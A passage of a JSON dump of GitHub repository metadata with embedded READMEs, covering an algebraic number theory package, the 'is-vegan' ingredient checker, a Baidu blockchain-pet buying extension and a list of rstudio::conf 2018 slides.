display_ambiguous_classes(-44)\nx^2 + 11⋅y^2\n2⋅x^2 + 2⋅xy + 6⋅y^2\n>>> display(*reduced(18, -10, 2))\n2⋅x^2 + 2⋅xy + 6⋅y^2\n```\n\n### Real polynoms\n\n``` python\n>>> from algnuth.polynom import Polynomial\n>>> P = Polynomial([0] * 10 + [-1, 0, 1])\n>>> print(P)\nX^12-X^10\n>>> P(2)\n3072\n>>> P.disc\n0\n>>> P.sturm() # Number of distinct real roots\n3\n>>> P.r1 # Number of real roots with multiplicity\n12\n```\n\n### Modular arithmetic\n\n``` python\n>>> P = Polynomial([1, 2, 3])\n>>> Pmodp = P % 41\n>>> print(Pmodp ** 3)\n27⋅X^6+13⋅X^5+22⋅X^4+3⋅X^3+21⋅X^2+6⋅X+1\n>>> print((P ** 3) % 41)\n27⋅X^6+13⋅X^5+22⋅X^4+3⋅X^3+21⋅X^2+6⋅X+1\n```\n\n### Polynomial division\n\n``` python\n>>> A = Polynomial([1, 2, 3, 4]) % 7\n>>> B = Polynomial([0, 1, 2]) % 7\n>>> print(A)\n4⋅X^3+3⋅X^2+2⋅X+1\n>>> print(B)\n2⋅X^2+X\n>>> print(A % B)\n5⋅X+1\n>>> print(A // B)\n2⋅X+4\n>>> print((A // B) * B + A % B)\n4⋅X^3+3⋅X^2+2⋅X+1\n```\n\n### Berlekamp's factorization algorithm\n\n``` python\n>>> P = Polynomial([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12])\n>>> Pmodp = P % 41\n>>> print(Polynomial.ppfactors(Pmodp.factor()))\n12⋅(X+31)⋅X⋅(X^2+40⋅X+24)⋅(X^2+36⋅X+13)⋅(X^6+34⋅X^5+26⋅X^4+13⋅X^3+25⋅X^2+26⋅X+35)\n```\n\n### Unique Factorization of Ideals\n\n``` python\n>>> from algnuth.ideals import factorIdeals\n>>> factorIdeals(Polynomial([4, 0, 0, 1]))\nX^3+4 mod 2 = X^3\n(2) = (2, α)^3\nX^3+4 mod 3 = (X+1)^3\n(3) = (3, α+1)^3\nX^3+4 mod 5 = (X+4)⋅(X^2+X+1)\n(5) = (5, α+4)⋅(5, α^2+α+1)\n```\n","byteSize":2794},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":255},"createdAt":"2018-02-04T23:37:54Z","updatedAt":"2018-02-16T20:49:21Z","pushedAt":"2018-02-15T20:45:28Z","description":"Algebraic Number Theory package","subscribersCount":{"totalCount":7},"diskUsage":49,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":4},"commits":{"totalCount":2}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":37}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"hmontazeri","followers":{"totalCount":10},"repositories":{"totalCount":1},"following":{"totalCount":5},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":"https://twitter.com/h_montazeri"},"repository":{"name":"is-vegan","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":15,"readme_md":{"text":"[![Build Status](https://travis-ci.org/hmontazeri/is-vegan.svg?branch=master)](https://travis-ci.org/hmontazeri/is-vegan) [![npm version](https://badge.fury.io/js/is-vegan.svg)](https://badge.fury.io/js/is-vegan) [![codecov](https://codecov.io/gh/hmontazeri/is-vegan/branch/master/graph/badge.svg)](https://codecov.io/gh/hmontazeri/is-vegan) [![Gitter](https://img.shields.io/gitter/room/nwjs/nw.js.svg)](https://gitter.im/is-vegan/Lobby) [![Open Source Love](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](https://github.com/ellerbrock/open-source-badges/)\n\n# is-vegan\n\nIs-Vegan helps you to find out which food ingredients are vegan / non-vegan. It can answer that on 1 ingredient or on a list of ingredients. It uses a 850+ entries list of non-vegan ingredients.\n\n[How to use?](#usage)\n\n## Why?\n\nWe are aware that 'veganism' and the definition of it can be a hot topic. We created the non-vegan list keeping in mind that veganism in dietary terms, it denotes the practice of dispensing with all products derived wholly or partly from animals.\n\nOur first step is the approach to help people understand, which products, and where applicable its ingredients, do not involve, or have involved, the use of any animal product, by-product or derivative. It is not driven about any vegan lifestyle choice or stereotype.\nWe welcome and appreciate any help and concerence regarding the nonvegan/canbevegan list.\n\nCurrently we are unfortunatly not adressing any other forms of exploitation of, and cruelty to, animals for clothing, cosmetics or any other purpose.\n\n**Thank you all for your comments, we appreciate the discussion, as we grow and learn from your input.**\n\n## Sources\n\nWe want to make sure that you understand how is-vegan is implemented. We analyzed as many good information websites for vegan / non-vegan ingredients as we found to get a very accurate list of ingredients. **However, feel free to send a pull request with an updated version of the list.**\n\nWebsites we parsed:\n\n* [veganpeace](http://www.veganpeace.com/ingredients/ingredients.htm)\n* [peta](https://www.peta.org/living/food/animal-ingredients-list/)\n* [veganwolf](http://www.veganwolf.com/animal_ingredients.htm)\n\n**and we added also a few ourselves...**\n\n## Usage\n\n### Add\n\n```bash\nyarn add is-vegan\n```\n\nor\n\n```bash\nnpm install is-vegan --save\n```\n\n### example\n\n```javascript\nconst isVegan = require('is-vegan');\n\n// or\n\nimport * as isVegan from 'is-vegan';\n\n// example for single ingredient\nisVegan.isVeganIngredient('soy'); // true\nisVegan.isVeganIngredient('milk'); // false\n\n// example for list of ingredients\nisVegan.isVeganIngredientList(['aspic', 'albumin']); // false\nisVegan.isVeganIngredientList(['soy', 'cacao butter']); // true\n\n// example for list of ingredients\nisVegan.containsNonVeganIngredients(['aspic', 'albumin', 'soy']); // ['aspic', 'albumin']\nisVegan.containsNonVeganIngredients(['soy', 'cacao butter']); // []\n\n// example for list of ingredients wich contain flagged and non-vegan ingredients\nisVegan.checkIngredients(['soy', 'cacao butter', 'pork', 'beef', 'glycine']);\n// returns\n// {\n//   nonvegan: ['pork', 'beef'],\n//   flagged: ['glycine']\n// }\n\n// or\n\nimport { checkIngredients } from 'is-vegan';\n\n// example for list of ingredients wich contain flagged and non-vegan ingredients\ncheckIngredients(['soy', 'cacao butter', 'pork', 'beef', 'glycine']);\n\n// returns\n// {\n//   nonvegan: ['pork', 'beef'],\n//   flagged: ['glycine']\n// }\n```\n\n### real world example\n\n[Products searched on USDA Food Composition Databases](https://ndb.nal.usda.gov/ndb/search/list)\n\n```javascript\nconst isVegan = require('is-vegan');\n\n// MOSER ROTH, DARK CHOCOLATE\nisVegan.isVeganIngredientList([\n  'COCOA LIQUOR',\n  'SUGAR',\n  'COCOA BUTTER',\n  'ALKALIZED REDUCED FAT COCOA POWDER',\n  'SOY LECITHIN EMULSIFIER',\n  'GROUND VANILLA'\n]); // returns true\n```\n\nCheckout: [RunKit \"is-vegan-playground\" for more examples](https://runkit.com/hmontazeri/is-vegan-playground)\n\n## Test\n\n```bash\nyarn test\n```\n\n## TODO\n\n* extend list\n\n## Authors\n\n* Hamed Montazeri\n* Meike Rittmeier\n","byteSize":4065},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":316},"createdAt":"2018-02-04T02:43:38Z","updatedAt":"2018-02-17T02:24:46Z","pushedAt":"2018-02-16T20:56:17Z","description":"Is-Vegan helps you to find out which food ingredients are vegan / non-vegan","subscribersCount":{"totalCount":7},"diskUsage":187,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":2},"pullRequestsMerged":{"totalCount":7},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":8}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":6},"issuesClosed":{"totalCount":3},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":8},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":120}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"playwithblockchain","repositories":{"totalCount":1},"location":null,"members":{"totalCount":0},"websiteUrl":null},"repository":{"name":"baidu-pet-chain-buyer","primaryLanguage":{"name":"HTML"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":89,"readme_md":{"text":"# baidu-pet-chain-buyer\n\n<p>百度莱茨狗抢购插件</p>\n\n### Chrome商店地址\n\nhttps://chrome.google.com/webstore/detail/%E7%99%BE%E5%BA%A6%E8%8E%B1%E8%8C%A8%E7%8B%97/fgpcgbppajchcfdnphppkhkfhbpnmoji</p>\n\n### 打赏支持\n\n<p>打赏支持作者持续开发完善</p>\n<p><img src=\"images/ds.png\" /></p>\n<p>\n  BTC: 1GsP6UQZbBw4VTHhEpKQh62d4Q3Go1Zm8W<br/>\n  ETH: 0x2e8c4c3a973afd055d7877b829612f1d08fb48c0\n</p>\n\n### 联系作者\n\n<p>关注作者公众号</p>\n<p><img src=\"images/wechat-qrcode.jpg\" width=\"128\" height=\"128\" /></p>\n\n        \n### 交流QQ群\n\n* 1群：324894682（升级为2000人群，请加）\n* 2群：707356594（已满）\n* 3群：172936941（已满）\n\n### 版本更新\n\n* 2017-02-09 2.0版发布，全新界面化，支持手动输入验证码\n* 2017-02-05 支持配置买入价格\n* 2017-02-04 首次发布&开源\n","byteSize":839},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":340},"createdAt":"2018-02-04T11:17:16Z","updatedAt":"2018-02-17T03:30:48Z","pushedAt":"2018-02-10T17:47:44Z","description":"百度莱茨狗抢购插件","subscribersCount":{"totalCount":24},"diskUsage":368,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":3},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}}]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":5},"issuesClosed":{"totalCount":13},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":7},"participants":{"totalCount":6}}},{"node":{"comments":{"totalCount":12},"participants":{"totalCount":12}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":6},"participants":{"totalCount":7}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":7}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":9},"participants":{"totalCount":8}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":3}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":26}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"simecek","followers":{"totalCount":31},"repositories":{"totalCount":52},"following":{"totalCount":4},"location":null,"organizations":{"totalCount":1},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":12},"stargazers":{"totalCount":25}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":4}}}],"totalCount":23},"websiteUrl":"https://simecek.github.io"},"repository":{"name":"RStudioConf2018Slides","primaryLanguage":null,"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":33,"readme_md":{"text":"# Links to slides from rstudio::conf 2018\n\nLinks to slides for talks at the\n[rstudio::conf](https://www.rstudio.com/conference/) 2018\n\nSchedule: <https://www.rstudio.com/conference/#conference>\n\nOfficial [rstudio-conf repo](https://github.com/rstudio/rstudio-conf/tree/master/2018) for all the materials\n\nPull requests welcome! Or add an issue, or tweet\n[@simecek](https://twitter.com/simecek) or email\n[Petr Simecek](http://www.google.com/recaptcha/mailhide/d?k=01Sq44R95fB59PDhzVrseCZg==&c=cn4529_e9KalygaXOLepFdgH5UafV3LG93pXdpGY3vg=).\n\nBased on [Karl Broman's](http://kbroman.org) template from the [rstudio::conf 2017](https://github.com/kbroman/RStudioConf2017Slides).\n\n---\n\n## Saturday 2018-02-03\n\nLive Stream: [Day 2](https://www.youtube.com/watch?v=Ol1FjFR2IMU)\n\n### Keynote\n\n[Machine Learning with R and TensorFlow](https://beta.rstudioconnect.com/ml-with-tensorflow-and-r/), [JJ Allaire](https://github.com/jjallaire), [@fly_upside_down](https://twitter.com/fly_upside_down)\n\n### Packages\n\n- [Five packages in five weeks - from boredom to contribution via blogging](http://giorasimchoni.com/rstudio_conf_2018_talk.html), [Giora Simchoni](http://giorasimchoni.com/), [@GioraSimchoni](https://twitter.com/GioraSimchoni)\n\n- [You can make a package in 20 minutes](https://github.com/jimhester/presentations/tree/master/2018_02_03-You-can-make-a-package-in-20-minutes#readme), [Jim Hester](http://www.jimhester.com/), [@jimhester_](https://twitter.com/jimhester_)\n\n- [What makes a great R package?](https://github.com/joseph-rickert/RStudio-conf_2018), [Joseph Rickert](https://github.com/joseph-rickert), [@rstudiojoe](https://twitter.com/rstudiojoe)\n\n- [Contributing to the tidyverse](http://bit.ly/tverse-contrib), [Mara Averick, @dataandme](https://twitter.com/dataandme)\n\n### Case-study-3\n\n- [Teach the Tidyverse to beginners](https://github.com/rstudio/rstudio-conf/tree/master/2018/TeachTidyverse-DavidRobinson), [David Robinson](http://varianceexplained.org/), [@drob](https://twitter.com/drob)\n\n- A SAS-to-R success story, Elizabeth J. Atkinson\n\n- [How I Learned to Stop Worrying and Love the Firewall](https://github.com/rstudio/rstudio-conf/tree/master/2018/Stop_Worrying_Love_The_Firewall--Ian_Lyttle), [Ian Lyttle](https://github.com/ijlyttle/), [@ijlyttle](https://twitter.com/ijlyttle)\n\n- Achieving impact with advanced analytics: Breaking down the adoption barrier , Aaron Horowitz\n\n### Interop\n\n- Large scale machine learning using TensorFlow, BigQuery and CloudML Engine within RStudio, Michael Quinn\n\n- [Deploying TensorFlow models with tfdeploy](http://rpubs.com/jluraschi/deploying-tensorflow-rstudio-conf), [Javier Luraschi](https://github.com/javierluraschi), [@javierluraschi](https://twitter.com/javierluraschi)\n\n- [Building Spark ML pipelines with sparklyr](https://s3-us-west-2.amazonaws.com/kevinykuo/rsconf-sparklyr/rstudio-conf-2018-sparklyr.html), [Kevin Kuo](https://github.com/kevinykuo), [@kevinykuo](https://twitter.com/kevinykuo)\n\n- Reinforcement learning in Minecraft with CNTK-R, Ali Zaidi\n\n### Teaching\n\n- Data-driven curriculum development, Nick Carchedi\n\n- Kaggle in the classroom: using R and GitHub to run predictive modeling competitions, Colin Rundel\n\n- [Something old, something new, something borrowed, something blue: Ways to teach data science (and learn it too!)](https://github.com/rstudio/rstudio-conf/tree/master/2018/ModernDive_Something_Blue-Chester_Ismay), [Chester Ismay](http://chester.rbind.io/), [@old_man_chester](https://twitter.com/old_man_chester)\n\n- [Training an army of new data scientists](https://www.slideshare.net/Pinnacle_Twitter/r-studio-conference), Marco Blume, [@PinnacleSports](https://twitter.com/PinnacleSports)\n\n### Case-study-4\n\n- Differentiating by data science, Eric Colson\n\n- Imagine Boston 2030: Using R-Shiny to keep ourselves accountable and empower the public, Kayla Patel\n\n- [Agile data science](https://github.com/rstudio/rstudio-conf/tree/master/2018/Agile_Data_Science--Elaine_McVey), [Elaine McVey](https://github.com/eamcvey), [@eamcvey](https://twitter.com/eamcvey)\n\n- [Storytelling with R](https://github.com/rstudio/rstudio-conf/tree/master/2018/Storytelling_with_R-Olga_Pierce), [Olga Pierce](https://www.propublica.org/people/olga-pierce), [@olgapierce](https://twitter.com/olgapierce)\n\n### Production-2\n\n- [Sharing analysis results with RStudio Connect](https://github.com/trestletech/rsconf-2018), [Jeff Allen](https://github.com/trestletech)\n\n- [Parameterized R Markdown reports with RStudio Connect](https://github.com/rstudio/rstudio-conf/tree/master/2018/Fruit_For_Thought--Aron_Atkins) (Fruit for Thought), [Aron Atkins](http://gweep.net/~aron/), [@aronatkins](https://twitter.com/aronatkins)\n\n- [Drill-down reporting with Shiny](https://github.com/bborgesr/rstudio-conf-2018), [Barbara Borges Ribeiro](https://github.com/bborgesr)\n\n- [The R Admin is rad: A guide to professional R tooling and integration](https://github.com/nwstephens/r-admin-2018), [Nathan Stephens](https://github.com/nwstephens), [@nwstephens](https://twitter.com/nwstephens)\n\n---\n\n## Friday 2018-02-02\n\nLive Stream: [Day 1](https://www.youtube.com/watch?v=ogy7rHWlsQ8)\n\n### Keynote\n\n- [To the tidyverse and beyond: Challenges for the Future in Data Science](http://www.dicook.org/files/rstudio/#1), [Diane Cook](http://www.dicook.org/), [@visnut](https://twitter.com/visnut)\n\n### Tidy-1\n\n- [Tidy spatial data analysis](https://github.com/edzer/rstudio_conf), [Edzer Pebesma](https://github.com/edzer)\n\n- [The future of time series and financial analysis in the tidyverse](https://github.com/business-science/presentations/tree/master/2018_02_02_rstudio-conf-2018/presentation), [Davis Vaughan](https://github.com/DavisVaughan?tab=repositories), [@dvaughan32](https://twitter.com/dvaughan32)\n\n- [infer: a package for tidy statistical inference](http://bit.ly/2DYoBOz), [Andrew Bray](http://infer.netlify.com/)\n\n- [Tidying up your network analysis with tidygraph and ggraph](https://www.data-imaginist.com/slides/rstudioconf2018/assets/player/keynotedhtmlplayer#0), [Thomas Lin Pedersen](https://github.com/thomasp85), [@thomasp85](https://twitter.com/thomasp85)\n\n### Shiny\n\n- [Scaling Shiny apps with async programming](https://speakerdeck.com/jcheng5/r-promises), Joe Cheng, [@jcheng](https://twitter.com/jcheng)\n\n- [Developing robust shiny apps with regression testing](https://github.com/rstudio/rstudio-conf/tree/master/2018/Shinytest-Winston_Chang), [Winston Chang](https://github.com/wch), [@winston_chang](https://twitter.com/winston_chang)\n\n- [Make shiny fast by doing as little work as possible](https://tailrecursion.com/slides/fast-shiny/#/title-slide), [Alan Dipert](https://tailrecursion.com/~alan/index.cgi/index.html), [@alandipert](https://twitter.com/alandipert)\n\n- [Scaling Shiny](https://github.com/slopp/shinyloadtest-results), [Sean Lopp](https://github.com/slopp)\n\n### IDE/rmarkdown\n\n- [RStudio 1.1 new features](https://kevinushey-2018-rstudio-conf.netlify.com/slides.html#1), [Kevin Ushey](http://kevinushey.github.io/), [@kevin_ushey](https://twitter.com/kevin_ushey)\n\n- RStudio Server Pro 1.1 new features, Jonathan McPherson\n\n- Learning R with rstudio.cloud, Mel Gregory\n\n- [Blogdown](https://slides.yihui.name/2018-blogdown-rstudio-conf-Yihui-Xie.html#1), [Yihui Xie](https://yihui.name/), [@xieyihui](https://twitter.com/xieyihui)\n\n### Tidy-2\n\n- [The lesser known stars of the tidyverse](https://github.com/robinsones/rstudio-conf-2018-talk), [Emily Robinson](https://robinsones.github.io/), [@robinson_es](https://twitter.com/robinson_es)\n\n- [Augmenting data exploration with interactive graphics](https://talks.cpsievert.me/20180202), [Carson Sievert](http://cpsievert.me/), [@cpsievert](http://twitter.com/cpsievert/)\n\n- [tidycf: Turning analysis on its head by turning cashflows on their sides](https://www.slideshare.net/EmilyRiederer/tidycf-turning-cashflows-on-their-sides-to-turn-analysis-on-its-head), [Emily Riederer](https://www.linkedin.com/in/emilyriederer/), [@EmilyRiederer](https://twitter.com/EmilyRiederer)\n\n- [Modeling in the tidyverse](https://github.com/topepo/rstudio-conf/tree/master/2018/Modeling_in_the_Tidyverse--Max_Kuhn), [Max Kuhn](https://github.com/topepo), [@topepos](https://twitter.com/topepos)\n\n### Case-study-1\n\n- [The unreasonable effectiveness of empathy](https://github.com/rstudio/rstudio-conf/blob/master/2018/Rstudio_%20unreasonable%20empathy.pdf), [JD Long](https://github.com/CerebralMastication), [@CMastication](https://twitter.com/CMastication)\n\n- Open-source solutions for medical marijuana, Carl Ganz\n\n- TBD, Logan Meltabarger\n\n- [Phrasing: communicating data science through tweets, gifs, and classic misdirection](https://github.com/batpigandme/phrasing), [Mara Averick, @dataandme](https://twitter.com/dataandme)\n\n### Rmarkdown\n\n- [R Markdown: Eight ways](https://github.com/mine-cetinkaya-rundel/rstudioconf-2018-rmd-eight-ways), [Mine Cetinkaya-Rundel](http://www2.stat.duke.edu/~mc301/), [@minebocek](https://twitter.com/minebocek)\n\n- Adaptive feedback for learnr tutorials, Daniel Kaplan\n\n- Beyond R: Using R Markdown with python, sql, bash, and more, Aaron Berg\n\n- [Branding and automating your work with R Markdown](https://github.com/Sorenson-Impact/rmarkdown-branding-talk), [Daniel Hadley](http://danielphadley.com/), [@danielphadley](https://twitter.com/danielphadley)\n\n### Programming\n\n- Tidy eval: programming with dplyr, tidyr, and ggplot2, Hadley Wickham\n\n- [Data rectangling](https://speakerdeck.com/jennybc/data-rectangling-1), [Jenny Bryan](https://github.com/jennybc), [@JennyBryan](https://twitter.com/JennyBryan)\n\n- [An assignment operator to unpack vectors and lists](https://github.com/nteetor/presentations/tree/master/rstudio-conf-2018#readme), [Nathan Teetor](https://github.com/nteetor), [@ntweetor](https://twitter.com/ntweetor)\n\n- [Debugging techniques in RStudio](https://github.com/ajmcoqui/debuggingRStudio), [Amanda Gadrow](https://github.com/ajmcoqui), [@ajmcoqui](https://twitter.com/ajmcoqui)\n\n\n### Case-study-2\n\n- Rapid prototyping data products using Shiny, Tanya Cashorali\n\n- [Understanding PCA using Shiny and Stack Overflow data](https://speakerdeck.com/juliasilge/understanding-principal-component-analysis-using-stack-overflow-data), [Julia Silge](https://juliasilge.com/), [@juliasilge](https://twitter.com/juliasilge)\n\n- Accelerating cancer research with R, Sandra Griffith\n\n- [Developing and deploying large scale shiny applications](https://github.com/FrissAnalytics/RSTUDIO-conf-2018), Herman Sontrop\n\n### Production-1\n\n- R for Presidents, Tareef Kawaf\n\n- [Connecting to open source databases](https://krlmlr.github.io/rstudio-conf18/#1), [Kirill Müller](https://github.com/krlmlr), [@krlmlr](https://twitter.com/krlmlr)\n\n- [Best practices for working with databases](https://github.com/edgararuiz/db_best_practices_2018/blob/master/best_practices.pdf), [Edgar Ruiz](https://www.linkedin.com/in/edgararuiz), [@theotheredgar](https://twitter.com/theotheredgar)\n\n- [Plumber: turning your R code into an API](https://github.com/trestletech/rsconf-2018), [Jeff Allen](https://github.com/trestletech)\n\n---\n\n## Training Days\n\n- [Intro to R & RStudio](https://github.com/AmeliaMN/IntroToR), [Amelia McNamara](http://www.science.smith.edu/~amcnamara/), [@AmeliaMN](https://twitter.com/AmeliaMN)\n\n- [Data Science in the Tidyverse](https://github.com/cwickham/data-science-in-tidyverse), [Charlotte Wickham](http://cwick.co.nz/), [@cvwickham](https://twitter.com/cvwickham)\n\n- [Intro to Shiny & R Markdown](https://github.com/mine-cetinkaya-rundel/rstudioconf-2018-intro-shiny-rmarkdown), [Mine Çetinkaya-Rundel](http://www2.stat.duke.edu/~mc301/), [@minebocek](https://twitter.com/minebocek)\n\n- [Applied Machine Learning](https://github.com/topepo/rstudio-conf-2018), [Max Kuhn](https://github.com/topepo)\n\n- [Intermediate Shiny](https://github.com/jcheng5/shiny-training-rstudioconf-2018), [Joe Cheng](https://github.com/jcheng5), [@jcheng](https://twitter.com/jcheng)\n\n- [Extending the Tidyverse](http://rstd.io/tidy-tools), [Hadley Wickham](https://github.com/hadley), [@hadleywickham](https://twitter.com/hadleywickham)\n\n- [What They Forgot to Teach You About R](https://github.com/jennybc/what-they-forgot) (aka Getting S*%! Done in R),\n[Jenny Bryan](https://github.com/jennybc), [@JennyBryan](https://twitter.com/JennyBryan)\n\n- [Big Data with R](https://github.com/rstudio/bigdataclass2018/), [Edgar Ruiz](https://www.linkedin.com/in/edgararuiz/), [@theotheredgar](https://twitter.com/theotheredgar)\n\n- [Tidyverse Train-the-Trainer](https://github.com/rstudio-education/teach-the-tidyverse), [Garrett Grolemund](https://github.com/garrettgman), [@statgarrett](https://twitter.com/statgarrett)\n","byteSize":12703},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":110},"createdAt":"2018-02-03T07:32:42Z","updatedAt":"2018-02-16T20:28:45Z","pushedAt":"2018-02-11T01:44:59Z","description":"Links to slides for talks at the rstudio::conf 2018","subscribersCount":{"totalCount":8},"diskUsage":46,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":7},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":3},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":36}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"apex","repositories":{"totalCount":21},"location":"Victoria BC","members":{"totalCount":1},"websiteUrl":"https://apex.sh"},"repository":{"name":"gui","primaryLanguage":{"name":"CSS"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":8,"readme_md":null,"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":114},"createdAt":"2018-02-03T19:14:23Z","updatedAt":"2018-02-14T23:19:36Z","pushedAt":"2018-02-04T16:39:51Z","description":"GitHub readme UI 